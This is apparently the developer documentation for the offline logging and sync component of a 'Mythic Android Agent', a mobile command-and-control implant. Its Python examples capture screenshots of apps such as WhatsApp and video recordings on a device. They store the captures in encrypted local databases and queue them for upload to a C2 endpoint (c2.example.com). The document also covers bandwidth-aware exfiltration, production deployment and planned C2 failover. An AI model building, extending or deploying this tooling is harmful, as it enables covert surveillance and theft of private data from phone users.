# Offline Storage and Synchronization System

This document describes the advanced offline storage and synchronization capabilities implemented for the Mythic Android Agent.

## Overview

The system provides robust offline capabilities with encrypted storage, intelligent synchronization, and adaptive network handling. It consists of two main components:

1. **Advanced Offline Logger** (`utils/offline_logger.py`) - Encrypted SQLite storage with compression
2. **Data Synchronizer** (`data_sync.py`) - Queue management, retry logic, and conflict resolution

## Key Features

### Encrypted Storage (SQLCipher)
- **SQLCipher Integration**: All data is stored in encrypted SQLite databases
- **Key Derivation**: Encryption keys are derived from campaign ID and device ID
- **Secure Memory**: Memory security enabled to prevent key exposure
- **Performance Optimized**: 4KB page size for optimal mobile performance

### Circular Buffer Management
- **Intelligent Storage**: Automatic cleanup when storage limits are exceeded
- **Priority Preservation**: Higher priority entries are retained longer
- **Compression**: Data is compressed with zlib before storage (level 6)
- **Statistics Tracking**: Comprehensive compression and storage metrics

### Bandwidth Detection and Adaptation
- **Connection Type Detection**: Automatically detects WiFi vs Cellular connections
- **Speed Testing**: Measures download speed and latency
- **Quality Classification**: Classifies connections as excellent/good/poor/offline
- **Adaptive Batching**: Adjusts sync batch sizes based on connection quality

### Intelligent Synchronization
- **Priority Queue**: Operations are prioritized and processed accordingly
- **Exponential Backoff**: Failed operations retry with increasing delays
- **Conflict Resolution**: Handles data conflicts with multiple resolution strategies
- **Bandwidth Awareness**: Sync behavior adapts to network conditions

## Architecture

### Core Components

#### AdvancedOfflineLogger
```python
from utils.offline_logger import AdvancedOfflineLogger

config = {
    "campaign_id": "campaign_001",
    "device_id": "device_001",
    "storage_path": "/data/data/com.app/files/offline",
    "max_entries": 10000
}

logger = AdvancedOfflineLogger(config)
```

**Key Methods:**
- `log_event(event_type, data, priority="normal")` - Log structured events
- `log_artifact(artifact_type, data, metadata=None)` - Log binary artifacts
- `get_bandwidth_metrics()` - Get current network metrics
- `get_storage_stats()` - Get storage statistics
- `cleanup_old_data(hours=24)` - Clean up old synced data

#### DataSynchronizer
```python
from data_sync import create_data_synchronizer

synchronizer = create_data_synchronizer(
    offline_logger,
    c2_endpoints=["https://c2.example.com/api/sync"],
    config={"sync_interval_seconds": 60}
)

synchronizer.start()
```

**Key Methods:**
- `start()` - Start the synchronization service
- `stop()` - Stop the synchronization service
- `force_sync(priority_filter=None)` - Force immediate sync
- `get_sync_status()` - Get current sync status
- `queue_sync_operation(entry_ids, priority=5)` - Queue manual sync

### Data Structures

#### LogEntry
```python
@dataclass
class LogEntry:
    id: str
    timestamp: float
    event_type: str
    campaign_id: str
    device_id: str
    data: Any
    compressed_size: int
    original_size: int
    sync_status: str = "pending"
    retry_count: int = 0
```

#### BandwidthMetrics
```python
@dataclass
class BandwidthMetrics:
    last_check: float
    download_speed: float  # KB/s
    upload_speed: float    # KB/s
    latency: float         # ms
    connection_type: str   # wifi, cellular, unknown
    quality: str           # excellent, good, poor, offline
```

## Configuration

### Offline Logger Configuration
```python
config = {
    # Identity
    "campaign_id": "campaign_001",
    "device_id": "device_001",
    
    # Storage
    "storage_path": "/data/data/com.app/files/offline",
    "max_entries": 10000,  # Maximum entries in circular buffer
    
    # Metadata
    "user_agent": "MythicAgent/1.0",
    "app_version": "1.0.0",
    
    # Sync
    "sync_enabled": True,
    "sync_interval_seconds": 300
}
```

### Synchronizer Configuration
```python
sync_config = {
    # Timing
    "sync_interval_seconds": 60,
    "cleanup_interval_seconds": 3600,
    
    # Retry Logic
    "max_retry_attempts": 5,
    "base_retry_delay": 1.0,
    "max_retry_delay": 300.0,
    
    # Batching
    "max_batch_size": 20,
    "max_queue_size": 1000,
    
    # Network
    "request_timeout": 30,
    "user_agent": "MythicAgent/1.0",
    
    # Cleanup
    "cleanup_hours": 24,
    "conflict_cleanup_hours": 48,
    "operation_cleanup_hours": 12
}
```

## Usage Examples

### Basic Logging
```python
# Initialize logger
logger = AdvancedOfflineLogger(config)

# Log a security event
event_id = logger.log_event(
    "security_event",
    {
        "type": "suspicious_app_installed",
        "app_name": "malware.apk",
        "risk_level": "high"
    },
    priority="high"
)

# Log binary artifact (screenshot)
artifact_id = logger.log_artifact(
    "screenshot",
    screenshot_bytes,
    metadata={"resolution": "1080x1920", "app": "com.whatsapp"}
)
```

### Synchronization Setup
```python
# Create synchronizer
synchronizer = create_data_synchronizer(
    logger,
    ["https://c2.example.com/api/sync"],
    sync_config
)

# Start background sync
synchronizer.start()

# Force immediate sync of high priority items
result = synchronizer.force_sync(priority_filter=8)
print(f"Sync result: {result}")

# Get sync status
status = synchronizer.get_sync_status()
print(f"Pending operations: {status['queue_stats']['pending']}")
```

### Bandwidth-Aware Operations
```python
# Check bandwidth before large operations
metrics = logger.get_bandwidth_metrics()

if metrics.quality == "excellent":
    # Upload large artifacts
    logger.log_artifact("video_recording", video_data)
elif metrics.quality == "poor":
    # Only sync critical events
    synchronizer.force_sync(priority_filter=9)
else:
    # Wait for better connection
    print("Waiting for better network conditions...")
```

## Security Considerations

### Encryption
- All data is encrypted using SQLCipher with AES-256 encryption
- Encryption keys are derived using HKDF from campaign and device identifiers
- Keys are never stored in plaintext
- Database files are encrypted at rest

### Key Management
```python
# Keys are derived deterministically
key = key_from_campaign_device(campaign_id, device_id)

# SQLCipher setup
conn.execute(f"PRAGMA key = '{key.hex()}'")
conn.execute("PRAGMA cipher_page_size = 4096")
conn.execute("PRAGMA cipher_memory_security = ON")
```

### Data Protection
- Compression reduces storage footprint and network usage
- Circular buffer prevents unlimited storage growth
- Automatic cleanup removes old synced data
- Memory security prevents key exposure

## Performance Optimization

### Storage Efficiency
- **Compression**: 60-80% size reduction typical
- **Circular Buffer**: Automatic size management
- **Indexed Queries**: Fast retrieval by timestamp and sync status
- **Batch Operations**: Efficient bulk inserts and updates

### Network Efficiency
- **Adaptive Batching**: Batch sizes adjust to network conditions
- **Compression**: Data compressed before transmission
- **Priority Scheduling**: Important data synced first
- **Connection Reuse**: HTTP connections are reused when possible

### Memory Management
- **Streaming Operations**: Large artifacts processed in chunks
- **Connection Pooling**: Database connections are pooled
- **Garbage Collection**: Explicit cleanup of large objects
- **Memory Security**: Sensitive data cleared from memory

## Monitoring and Debugging

### Storage Statistics
```python
stats = logger.get_storage_stats()
print(f"Total entries: {stats['total_entries']}")
print(f"Pending sync: {stats['pending_entries']}")
print(f"Compression ratio: {stats['compression_ratio']:.2f}")
print(f"Database size: {stats['database_size_bytes']} bytes")
```

### Sync Status
```python
status = synchronizer.get_sync_status()
print(f"Sync running: {status['is_running']}")
print(f"Queue stats: {status['queue_stats']}")
print(f"Bandwidth: {status['bandwidth_metrics']}")
print(f"Conflicts: {status['unresolved_conflicts']}")
```

### Conflict Resolution
```python
conflicts = synchronizer.conflict_resolver.get_unresolved_conflicts()
for conflict in conflicts:
    print(f"Conflict: {conflict.conflict_type}")
    print(f"Strategy: {conflict.resolution_strategy}")
    
    # Manually resolve if needed
    resolved = synchronizer.conflict_resolver.resolve_conflict(
        conflict.id,
        ConflictResolution.CLIENT_WINS
    )
```

## Error Handling

### Common Issues
1. **Database Corruption**: Automatic recovery attempts
2. **Network Failures**: Exponential backoff retry
3. **Storage Full**: Automatic circular buffer cleanup
4. **Sync Conflicts**: Multiple resolution strategies available

### Error Recovery
```python
try:
    event_id = logger.log_event("test", {"data": "value"})
    if not event_id:
        print("Failed to log event - check storage")
except Exception as e:
    print(f"Logging error: {e}")
    # Implement fallback logging
```

## Testing

### Run Example Demo
```bash
python example_offline_sync.py
```

This will demonstrate:
- Offline logging capabilities
- Bandwidth detection
- Synchronization setup
- Conflict resolution
- Storage management
- Cleanup operations

### Unit Tests
```bash
# Run offline logger tests
python -m pytest tests/test_offline_logger.py

# Run sync tests
python -m pytest tests/test_data_sync.py
```

## Dependencies

### Required Packages
```
pysqlcipher3==1.2.0    # SQLCipher Python bindings
sqlcipher==0.5.4       # SQLCipher library
requests==2.31.0       # HTTP client
cryptography==41.0.4   # Encryption utilities
```

### System Requirements
- SQLCipher library installed
- Python 3.7+
- Network access for synchronization
- Sufficient storage space for database

## Production Deployment

### Installation
1. Install SQLCipher system library
2. Install Python dependencies: `pip install -r requirements.txt`
3. Configure storage paths and endpoints
4. Initialize logger and synchronizer
5. Start background services

### Monitoring
- Monitor database size growth
- Track sync success rates
- Watch for conflict accumulation
- Monitor network usage patterns

### Maintenance
- Regular cleanup of old data
- Database integrity checks
- Key rotation procedures
- Performance monitoring

## Future Enhancements

### Planned Features
- Delta synchronization for large artifacts
- Multiple C2 endpoint failover
- Advanced conflict resolution strategies
- Real-time sync for critical events
- Encrypted backup and restore

### Performance Improvements
- Database connection pooling
- Async I/O for network operations
- Memory-mapped file operations
- Background compression optimization

This system provides a robust foundation for offline data collection and synchronization in challenging network environments while maintaining strong security and performance characteristics.
